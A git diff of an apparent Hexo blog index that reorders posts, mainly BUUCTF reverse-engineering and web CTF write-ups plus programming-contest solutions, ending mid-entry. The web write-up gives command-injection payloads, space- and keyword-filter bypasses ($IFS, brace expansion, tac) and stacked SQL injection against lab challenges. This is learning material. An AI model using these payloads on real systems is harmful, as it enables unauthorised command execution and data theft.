@@ -302,130 +302,6 @@ S翼在0力矩（俯仰力矩为零）的时候是有升力的
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF RE wp</title>
-    <url>/2024/08/13/BUUCTF-RE-wp/</url>
-    <content><![CDATA[easyre
-F5一下出
-
-直接打开的话，结束之后自动闪退，所以要用cmd
-
-flag:flag&#123;this_Is_a_EaSyRe&#125;
-reverse1shift+F12，然后Ctrl+F搜索关键词flag
-
-双击进入，ctrl+x查看交叉引用
-
-然后点击F5查看源码
-
-得到这一段内容，选中数字单击 r 可以转化为ascll码对应的字母
-可以知道，for循环把str2的 o 替换为 0
-
-双击 str2 进入，可以看到str2的数值
-
-那么flag就是替换之后的
-flag:flag&#123;hell0_w0rld&#125;
-reverse2IDA打开，一键F5
-
-发现是把i和r替换为1
-
-双击flag查看内容
-
-发现有一段是hacking_for_fun&#125;，替换即可得到flag
-flag:flag&#123;hack1ng_fo1_fun&#125;
-内涵的软件拖进查壳软件
-
-发现是32位文件，拖进IDA32
-shift+F12即可看到flag
-
-flag:flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;
-新年快乐发现是32位程序
-
-用IDA打开发现有壳
-
-拖进FFI工具中自动去壳
-
-然后拖进IDA，F5发现flag
-
-flag:flag&#123;HappyNewYear!&#125;
-xor32位
-
-拖进IDA，F5
-
-可以发现flag是异或得到的
-双击global，shift+E获得aFKWOXZUPFVMDGH的值
-
-保存到十进制，编写脚本即可获得flag
-l = [  102,  10, 107,  12, 119,  38,  79,  46,  64,  17,   120,  13,  90,  59,  85,  17, 112,  25,  70,  31,   118,  34,  77,  35,  68,  14, 103,   6, 104,  15,    71,  50,  79,   0]flag = &quot;&quot;flag += chr(l[0])for i in range(1,len(l)):    flag += chr(l[i]^l[i-1])print( flag )
-flag:flag&#123;QianQiuWanDai_YiTongJiangHu&#125;
-reverse3查壳发现没壳，32位，打开
-
-shift+F12看到flag
-
-双击，然后ctrl+x查看交叉引用，然后F5一下，得到以下页面
-
-进入sub_4110BE函数，发现是base64加密
-后面还有一个简单的位移运算
-密文变量是 Str2，shift+E保存
-
-编写脚本得到flag
-import base64s = [  101, 51, 110, 105, 102, 73, 72, 57, 98, 95,   67, 64, 110, 64, 100, 72]flag = &quot;&quot;for i in range(len(s)):    flag += chr(s[i]-i)print( flag )print( base64.b64decode(flag) )
-flag:flag&#123;i_l0ve_you&#125;
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF Web wp</title>
-    <url>/2024/08/16/BUUCTF-Web-wp/</url>
-    <content><![CDATA[[ACTF2020 新生赛]Exec
-输入127.0.0.1;ls
-
-发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
-最终在127.0.0.1;cd ../../../;ls找到了flag文件
-
-输入127.0.0.1;cd ../../../;ls得到flag
-
-flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
-[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
-根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
-
-得知不能输入空格
-
-所以我们需要绕过空格使用一下平替
-$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
-输入/?ip=127.0.0.1;cat$IFS1flag.php
-
-我们查看index.php
-
-使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
-F12即可得到flag
-
-;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
-flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
-[SUCTF 2019]EasySQL
-堆叠注入查询数据库
-1; show databases;
-
-查询表名
-
-1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
-尝试访问Flag，发现不行
-输入*,1
-
-这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
-flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
-[强网杯 2019]随便注]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20251027博客更新说明-新颜色哎</title>
     <url>/2025/10/27/20251027%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E8%AF%B4%E6%98%8E-%E6%96%B0%E9%A2%9C%E8%89%B2%E5%93%8E/</url>
     <content><![CDATA[1. 实时时钟背景色方案参考🎨 24小时背景色时间表
@@ -584,6 +460,130 @@ DOM 监听：MutationObserver 监听动态元素，实时更新样式
       </categories>
       <tags>
         <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF RE wp</title>
+    <url>/2024/08/13/BUUCTF-RE-wp/</url>
+    <content><![CDATA[easyre
+F5一下出
+
+直接打开的话，结束之后自动闪退，所以要用cmd
+
+flag:flag&#123;this_Is_a_EaSyRe&#125;
+reverse1shift+F12，然后Ctrl+F搜索关键词flag
+
+双击进入，ctrl+x查看交叉引用
+
+然后点击F5查看源码
+
+得到这一段内容，选中数字单击 r 可以转化为ascll码对应的字母
+可以知道，for循环把str2的 o 替换为 0
+
+双击 str2 进入，可以看到str2的数值
+
+那么flag就是替换之后的
+flag:flag&#123;hell0_w0rld&#125;
+reverse2IDA打开，一键F5
+
+发现是把i和r替换为1
+
+双击flag查看内容
+
+发现有一段是hacking_for_fun&#125;，替换即可得到flag
+flag:flag&#123;hack1ng_fo1_fun&#125;
+内涵的软件拖进查壳软件
+
+发现是32位文件，拖进IDA32
+shift+F12即可看到flag
+
+flag:flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;
+新年快乐发现是32位程序
+
+用IDA打开发现有壳
+
+拖进FFI工具中自动去壳
+
+然后拖进IDA，F5发现flag
+
+flag:flag&#123;HappyNewYear!&#125;
+xor32位
+
+拖进IDA，F5
+
+可以发现flag是异或得到的
+双击global，shift+E获得aFKWOXZUPFVMDGH的值
+
+保存到十进制，编写脚本即可获得flag
+l = [  102,  10, 107,  12, 119,  38,  79,  46,  64,  17,   120,  13,  90,  59,  85,  17, 112,  25,  70,  31,   118,  34,  77,  35,  68,  14, 103,   6, 104,  15,    71,  50,  79,   0]flag = &quot;&quot;flag += chr(l[0])for i in range(1,len(l)):    flag += chr(l[i]^l[i-1])print( flag )
+flag:flag&#123;QianQiuWanDai_YiTongJiangHu&#125;
+reverse3查壳发现没壳，32位，打开
+
+shift+F12看到flag
+
+双击，然后ctrl+x查看交叉引用，然后F5一下，得到以下页面
+
+进入sub_4110BE函数，发现是base64加密
+后面还有一个简单的位移运算
+密文变量是 Str2，shift+E保存
+
+编写脚本得到flag
+import base64s = [  101, 51, 110, 105, 102, 73, 72, 57, 98, 95,   67, 64, 110, 64, 100, 72]flag = &quot;&quot;for i in range(len(s)):    flag += chr(s[i]-i)print( flag )print( base64.b64decode(flag) )
+flag:flag&#123;i_l0ve_you&#125;
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF Web wp</title>
+    <url>/2024/08/16/BUUCTF-Web-wp/</url>
+    <content><![CDATA[[ACTF2020 新生赛]Exec
+输入127.0.0.1;ls
+
+发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
+最终在127.0.0.1;cd ../../../;ls找到了flag文件
+
+输入127.0.0.1;cd ../../../;ls得到flag
+
+flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
+[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
+根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
+
+得知不能输入空格
+
+所以我们需要绕过空格使用一下平替
+$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
+输入/?ip=127.0.0.1;cat$IFS1flag.php
+
+我们查看index.php
+
+使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
+F12即可得到flag
+
+;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
+flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
+[SUCTF 2019]EasySQL
+堆叠注入查询数据库
+1; show databases;
+
+查询表名
+
+1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
+尝试访问Flag，发现不行
+输入*,1
+
+这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
+flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
+[强网杯 2019]随便注]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1379,48 +1379,6 @@ B. Minimize Equal Sum Subarrays
       </tags>
   </entry>
   <entry>
-    <title>FJNU2024低程赛题解</title>
-    <url>/2024/12/02/FJNU2024%E4%BD%8E%E7%A8%8B%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
-    <content><![CDATA[比赛链接
-题目按总过题数量降序排列
-
-A.#include&lt;iostream&gt;using namespace std;signed main()&#123;    int a , b;cin &gt;&gt; a &gt;&gt; b;    int c = a - b;if( c &lt; 0 ) c = -c;    cout &lt;&lt; c &lt;&lt; endl;    return 0;&#125;
-H.#include&lt;iostream&gt;using namespace std;signed main()&#123;    int a , b , c;cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;    if( a == b &amp;&amp; b == c ) cout &lt;&lt; 1 &lt;&lt; endl;    else if( a == b || b == c || a == c ) cout &lt;&lt; 2 &lt;&lt; endl;    else cout &lt;&lt; 3 &lt;&lt; endl;    return 0; &#125;
-G.前面填充0，剩下的位数从头开始输出字符串，直到凑齐n位，即可
-#include&lt;iostream&gt;using namespace std;signed main()&#123;    int n , k;cin &gt;&gt; n &gt;&gt; k;    string s;cin &gt;&gt; s;    for(int i = 1;i &lt;= k;i ++)&#123;        cout &lt;&lt; 0;    &#125;    for(int i = k+1;i &lt;= n;i ++)&#123;        cout &lt;&lt; s[i-k-1];    &#125;cout &lt;&lt; endl;    return 0; &#125;
-B.小模拟，过的人还是挺多的，理清思路就好
-#include&lt;iostream&gt;using namespace std;int x , k , r;int leng( int num )&#123;    int ans = 0;    while( num )&#123;        num /= 10;        ans ++;    &#125;if( ans == 0 ) ans = 1;    return ans;&#125;void space( int num )&#123;    for(int i = 1;i &lt;= num;i ++) cout &lt;&lt; &quot; &quot;;&#125;signed main()&#123;    cin &gt;&gt; x &gt;&gt; k;    int len_init = leng(k) + 1 + leng(x);    while( x )&#123;        space( len_init - leng(k) - 1 - leng(x) );        r = x % k;        cout &lt;&lt; k &lt;&lt; &quot;|&quot; &lt;&lt; x &lt;&lt; &quot; &quot;;        if( r &lt; 10 ) cout &lt;&lt; r;        else&#123;            cout &lt;&lt; char(r-10+&#x27;A&#x27;);        &#125;cout &lt;&lt; &#x27;\n&#x27;;        space( len_init - leng(x) );        for(int i = 1;i &lt;= leng(x);i ++) cout &lt;&lt; &quot;-&quot;;        cout &lt;&lt; &#x27;\n&#x27;;        x /= k;    &#125;space(len_init-1);cout &lt;&lt; 0 &lt;&lt; &#x27;\n&#x27;;    return 0;&#125;
-F.一开始想二分套二分（大雾），后来发现只需要记录最长连续L的个数即可
-#include&lt;iostream&gt;using namespace std;const int N = 2e5;int n;string s;int top_R[N];signed main()&#123;    cin &gt;&gt; n &gt;&gt; s;    int top_num = 0;    int ans = 1 , conti = 1;    for(int i = 1;i &lt;= n;i ++)&#123;        if( s[i-1] == &#x27;L&#x27; ) conti ++;        else&#123;            conti = 1;        &#125;ans = max( conti , ans );    &#125;cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
-C.暴力会TLE，时间复杂度为 $O(2^n)$，即使是夹半搜索也要 $2^{50}$ 量级，故考虑dp
-感觉和背包问题比较像，甚至要简单一点；不同点在于背包问题是求最优，而本题是求是否到达
-#include&lt;iostream&gt;#include&lt;queue&gt;using namespace std;int n , x;int a[110] , b[110];int dp[10010][110];signed main()&#123;    cin &gt;&gt; n &gt;&gt; x;    for(int i = 1;i &lt;= n;i ++)&#123;        cin &gt;&gt; a[i] &gt;&gt; b[i];    &#125;    dp[0][0] = 1;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int p = min(a[i],b[i]);p &lt;= x;p ++)&#123;            if( p &gt;= a[i] ) dp[p][i] |= dp[p-a[i]][i-1];            if( p &gt;= b[i] ) dp[p][i] |= dp[p-b[i]][i-1];        &#125;    &#125;    if( dp[x][n] ) cout &lt;&lt; &quot;Yes&quot; &lt;&lt; endl;    else cout &lt;&lt; &quot;No&quot; &lt;&lt; endl;    return 0; &#125;
-E.并查集问题（当时写的时候以为是公共祖先弱化版，忘了并查集这个东西了）
-然后判断每种情况的状态，最后合并即可
-#include&lt;iostream&gt;using namespace std;const int N=1e5;int n , m;int ans , x , y , z;int bin[N+10];int fa[N+10];int get_fa( int p )&#123;    if( fa[p] == p ) return p;    return get_fa(fa[p]);&#125;signed main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for(int i = 1;i &lt;= n;i ++)&#123;        fa[i] = i;    &#125;    for(int i = 1;i &lt;= m;i ++)&#123;        cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;        if( bin[x] == 0 &amp;&amp; bin[y] == 0 )&#123;            ans ++;        &#125;else if( bin[x] &amp;&amp; bin[y] )&#123;            if( get_fa(x) != get_fa(y) )&#123;                ans --;            &#125;        &#125;bin[x] = bin[y] = 1;        fa[get_fa( x )] = fa[get_fa( y )] = min( get_fa( x ) , get_fa( y ) );    &#125;    for(int i = 1;i &lt;= n;i ++)&#123;        if( bin[i] == 0 ) ans ++;    &#125;    cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
-G.这题我也不知道怎么过的，应该是运气好凑巧了吧
-结束前十分钟写完思路发现样例二过不了，以为是假了，然后写下了//做法假了，没时间了，开摆！这句；后来发现忘了翻转这一步，加上了然后样例二过了，一提交居然AC了
-首先观察样例，因为存在不同解，所以试图找到解的规律
-2 3 3 4 -4 -7 -4 -1
-对以上操作积分一次（这个比喻有点抽象），可以发现只要确定了第一项，后面的就都确定了
-不妨设第一项为 0
-原式为： 2  3  3  4  -4  -7  -4  -1积分后：0  2  1  2  2  -6  -1  -3  2
-然后改变第一项，可以发现奇数项和偶数项分别加减第一项的改变值
-原式为： 2  3  3  4  -4  -7  -4  -1积分后：0  2  1  2  2  -6  -1  -3  2改首项：1  1  0  3  1  -5  -2  -2  1
-这时，我们只需要确定第一项即可
-但是第一项的范围为 ±1e9，所以需要借助和 幸运数字 的差值
-进一步的，我们如果希望改变后的数字是幸运数字，只需要和目标的幸运数字们分别作差；差值结果即为第一项为某一数字后，这一项在变换（积分）后会变为幸运数字
-由于每个幸运数字不同，故我们对于这个二维列表，只需要统计出现相同数字的最大次数即可（使用map进行统计）
-#include&lt;iostream&gt;#include&lt;map&gt;#define int long longusing namespace std;const int N = 1e5;int n , m;int s[N+10] , t[15];int state[N+10][11];map &lt; int , int &gt; mp;signed main()&#123;    mp.clear();    cin &gt;&gt; n &gt;&gt; m;    for(int i = 2;i &lt;= n;i ++)&#123;        cin &gt;&gt; s[i];    &#125;    for(int i = 1;i &lt;= m;i ++)&#123;        cin &gt;&gt; t[i];    &#125;    state[1][0] = 0;    for(int i = 2;i &lt;= n;i ++)&#123;        state[i][0] = s[i] - state[i-1][0];    &#125;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int j = 1;j &lt;= m;j ++)&#123;            state[i][j] = t[j] - state[i][0];            if( i % 2 ) state[i][j] = -state[i][j];        &#125;    &#125;    int ans = 0;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int j = 1;j &lt;= m;j ++)&#123;            mp[state[i][j]] ++;            ans = max( ans , mp[state[i][j]] );        &#125;    &#125;    cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
-]]></content>
-      <categories>
-        <category>算法竞赛</category>
-      </categories>
-      <tags>
-        <tag>算法竞赛</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ElGamal是个啥子玩意</title>
     <url>/2024/09/28/ElGamal%E6%98%AF%E4%B8%AA%E5%95%A5%E5%AD%90%E7%8E%A9%E6%84%8F/</url>
     <content><![CDATA[很早之前就听说ElGamal加密算法是一种公钥密码，但是具体实现和用途不甚了解，今天阅读了 A PUBLIC KEY CRYPTOSYSTEM AND A SIGNATURE SCHEME BASED ON DISCRETE LOGARITHMS 一文，故去了解了一下。特开此文，记录一下
@@ -1480,6 +1438,48 @@ from Crypto.Util.number import *p = None ; g = Nonepub = None#公钥也是公共
       </categories>
       <tags>
         <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FJNU2024低程赛题解</title>
+    <url>/2024/12/02/FJNU2024%E4%BD%8E%E7%A8%8B%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
+    <content><![CDATA[比赛链接
+题目按总过题数量降序排列
+
+A.#include&lt;iostream&gt;using namespace std;signed main()&#123;    int a , b;cin &gt;&gt; a &gt;&gt; b;    int c = a - b;if( c &lt; 0 ) c = -c;    cout &lt;&lt; c &lt;&lt; endl;    return 0;&#125;
+H.#include&lt;iostream&gt;using namespace std;signed main()&#123;    int a , b , c;cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;    if( a == b &amp;&amp; b == c ) cout &lt;&lt; 1 &lt;&lt; endl;    else if( a == b || b == c || a == c ) cout &lt;&lt; 2 &lt;&lt; endl;    else cout &lt;&lt; 3 &lt;&lt; endl;    return 0; &#125;
+G.前面填充0，剩下的位数从头开始输出字符串，直到凑齐n位，即可
+#include&lt;iostream&gt;using namespace std;signed main()&#123;    int n , k;cin &gt;&gt; n &gt;&gt; k;    string s;cin &gt;&gt; s;    for(int i = 1;i &lt;= k;i ++)&#123;        cout &lt;&lt; 0;    &#125;    for(int i = k+1;i &lt;= n;i ++)&#123;        cout &lt;&lt; s[i-k-1];    &#125;cout &lt;&lt; endl;    return 0; &#125;
+B.小模拟，过的人还是挺多的，理清思路就好
+#include&lt;iostream&gt;using namespace std;int x , k , r;int leng( int num )&#123;    int ans = 0;    while( num )&#123;        num /= 10;        ans ++;    &#125;if( ans == 0 ) ans = 1;    return ans;&#125;void space( int num )&#123;    for(int i = 1;i &lt;= num;i ++) cout &lt;&lt; &quot; &quot;;&#125;signed main()&#123;    cin &gt;&gt; x &gt;&gt; k;    int len_init = leng(k) + 1 + leng(x);    while( x )&#123;        space( len_init - leng(k) - 1 - leng(x) );        r = x % k;        cout &lt;&lt; k &lt;&lt; &quot;|&quot; &lt;&lt; x &lt;&lt; &quot; &quot;;        if( r &lt; 10 ) cout &lt;&lt; r;        else&#123;            cout &lt;&lt; char(r-10+&#x27;A&#x27;);        &#125;cout &lt;&lt; &#x27;\n&#x27;;        space( len_init - leng(x) );        for(int i = 1;i &lt;= leng(x);i ++) cout &lt;&lt; &quot;-&quot;;        cout &lt;&lt; &#x27;\n&#x27;;        x /= k;    &#125;space(len_init-1);cout &lt;&lt; 0 &lt;&lt; &#x27;\n&#x27;;    return 0;&#125;
+F.一开始想二分套二分（大雾），后来发现只需要记录最长连续L的个数即可
+#include&lt;iostream&gt;using namespace std;const int N = 2e5;int n;string s;int top_R[N];signed main()&#123;    cin &gt;&gt; n &gt;&gt; s;    int top_num = 0;    int ans = 1 , conti = 1;    for(int i = 1;i &lt;= n;i ++)&#123;        if( s[i-1] == &#x27;L&#x27; ) conti ++;        else&#123;            conti = 1;        &#125;ans = max( conti , ans );    &#125;cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
+C.暴力会TLE，时间复杂度为 $O(2^n)$，即使是夹半搜索也要 $2^{50}$ 量级，故考虑dp
+感觉和背包问题比较像，甚至要简单一点；不同点在于背包问题是求最优，而本题是求是否到达
+#include&lt;iostream&gt;#include&lt;queue&gt;using namespace std;int n , x;int a[110] , b[110];int dp[10010][110];signed main()&#123;    cin &gt;&gt; n &gt;&gt; x;    for(int i = 1;i &lt;= n;i ++)&#123;        cin &gt;&gt; a[i] &gt;&gt; b[i];    &#125;    dp[0][0] = 1;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int p = min(a[i],b[i]);p &lt;= x;p ++)&#123;            if( p &gt;= a[i] ) dp[p][i] |= dp[p-a[i]][i-1];            if( p &gt;= b[i] ) dp[p][i] |= dp[p-b[i]][i-1];        &#125;    &#125;    if( dp[x][n] ) cout &lt;&lt; &quot;Yes&quot; &lt;&lt; endl;    else cout &lt;&lt; &quot;No&quot; &lt;&lt; endl;    return 0; &#125;
+E.并查集问题（当时写的时候以为是公共祖先弱化版，忘了并查集这个东西了）
+然后判断每种情况的状态，最后合并即可
+#include&lt;iostream&gt;using namespace std;const int N=1e5;int n , m;int ans , x , y , z;int bin[N+10];int fa[N+10];int get_fa( int p )&#123;    if( fa[p] == p ) return p;    return get_fa(fa[p]);&#125;signed main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for(int i = 1;i &lt;= n;i ++)&#123;        fa[i] = i;    &#125;    for(int i = 1;i &lt;= m;i ++)&#123;        cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;        if( bin[x] == 0 &amp;&amp; bin[y] == 0 )&#123;            ans ++;        &#125;else if( bin[x] &amp;&amp; bin[y] )&#123;            if( get_fa(x) != get_fa(y) )&#123;                ans --;            &#125;        &#125;bin[x] = bin[y] = 1;        fa[get_fa( x )] = fa[get_fa( y )] = min( get_fa( x ) , get_fa( y ) );    &#125;    for(int i = 1;i &lt;= n;i ++)&#123;        if( bin[i] == 0 ) ans ++;    &#125;    cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
+G.这题我也不知道怎么过的，应该是运气好凑巧了吧
+结束前十分钟写完思路发现样例二过不了，以为是假了，然后写下了//做法假了，没时间了，开摆！这句；后来发现忘了翻转这一步，加上了然后样例二过了，一提交居然AC了
+首先观察样例，因为存在不同解，所以试图找到解的规律
+2 3 3 4 -4 -7 -4 -1
+对以上操作积分一次（这个比喻有点抽象），可以发现只要确定了第一项，后面的就都确定了
+不妨设第一项为 0
+原式为： 2  3  3  4  -4  -7  -4  -1积分后：0  2  1  2  2  -6  -1  -3  2
+然后改变第一项，可以发现奇数项和偶数项分别加减第一项的改变值
+原式为： 2  3  3  4  -4  -7  -4  -1积分后：0  2  1  2  2  -6  -1  -3  2改首项：1  1  0  3  1  -5  -2  -2  1
+这时，我们只需要确定第一项即可
+但是第一项的范围为 ±1e9，所以需要借助和 幸运数字 的差值
+进一步的，我们如果希望改变后的数字是幸运数字，只需要和目标的幸运数字们分别作差；差值结果即为第一项为某一数字后，这一项在变换（积分）后会变为幸运数字
+由于每个幸运数字不同，故我们对于这个二维列表，只需要统计出现相同数字的最大次数即可（使用map进行统计）
+#include&lt;iostream&gt;#include&lt;map&gt;#define int long longusing namespace std;const int N = 1e5;int n , m;int s[N+10] , t[15];int state[N+10][11];map &lt; int , int &gt; mp;signed main()&#123;    mp.clear();    cin &gt;&gt; n &gt;&gt; m;    for(int i = 2;i &lt;= n;i ++)&#123;        cin &gt;&gt; s[i];    &#125;    for(int i = 1;i &lt;= m;i ++)&#123;        cin &gt;&gt; t[i];    &#125;    state[1][0] = 0;    for(int i = 2;i &lt;= n;i ++)&#123;        state[i][0] = s[i] - state[i-1][0];    &#125;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int j = 1;j &lt;= m;j ++)&#123;            state[i][j] = t[j] - state[i][0];            if( i % 2 ) state[i][j] = -state[i][j];        &#125;    &#125;    int ans = 0;    for(int i = 1;i &lt;= n;i ++)&#123;        for(int j = 1;j &lt;= m;j ++)&#123;            mp[state[i][j]] ++;            ans = max( ans , mp[state[i][j]] );        &#125;    &#125;    cout &lt;&lt; ans &lt;&lt; endl;    return 0; &#125;
+]]></content>
+      <categories>
+        <category>算法竞赛</category>
+      </categories>
+      <tags>
+        <tag>算法竞赛</tag>
       </tags>
   </entry>
   <entry>
@@ -2549,21 +2549,6 @@ https://blog.csdn.net/timberman666/article/details/132723352
       </tags>
   </entry>
   <entry>
-    <title>hexo usage</title>
-    <url>/2024/05/23/hexo-usage/</url>
-    <content><![CDATA[hexo s  #启动并预览
-hexo c  #清除缓存文件 db.json 和已生成的静态文件 public 
-hexo g  #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写) 
-hexo d  #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)
-]]></content>
-      <categories>
-        <category>工具与技术使用</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buuoj古典密码学wp</title>
     <url>/2024/09/24/buuoj%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6wp/</url>
     <content><![CDATA[此博客用于整理，之前做过的古典密码学题目
@@ -3091,6 +3076,21 @@ flag:utflag&#123;d4nger0us_c1pherText_qq&#125;
       </tags>
   </entry>
   <entry>
+    <title>hexo usage</title>
+    <url>/2024/05/23/hexo-usage/</url>
+    <content><![CDATA[hexo s  #启动并预览
+hexo c  #清除缓存文件 db.json 和已生成的静态文件 public 
+hexo g  #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写) 
+hexo d  #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)
+]]></content>
+      <categories>
+        <category>工具与技术使用</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo新建博客但是要求输入第二行</title>
     <url>/2024/09/21/hexo%E6%96%B0%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%BD%86%E6%98%AF%E8%A6%81%E6%B1%82%E8%BE%93%E5%85%A5%E7%AC%AC%E4%BA%8C%E8%A1%8C/</url>
     <content><![CDATA[今天遇到了以下问题
@@ -3122,39 +3122,6 @@ root@LAPTOP-LDQVJGQS:/mnt/c/Users/coper/Desktop# sage --pip install pycryptodome
       </categories>
       <tags>
         <tag>cryptoCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rime自定义输入输出配置</title>
-    <url>/2025/10/22/rime%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[感觉好像被监视了~于是乎前段时间在windows下部署了小狼毫输入法
-但是遇到了问题，如果我想给别人发一个对钩，搜狗输入法直接输入dui就出来候选词了，但是rime不行
-故而学习了一下自定义
-我实用的是便携版，目录如下
-
-直接在主目录下新建一个文档custom_phrase.txt
-然后输入策略，用Tab键隔开
-
-然后重新部署
-
-输入dui就可以有✔的选项了
-
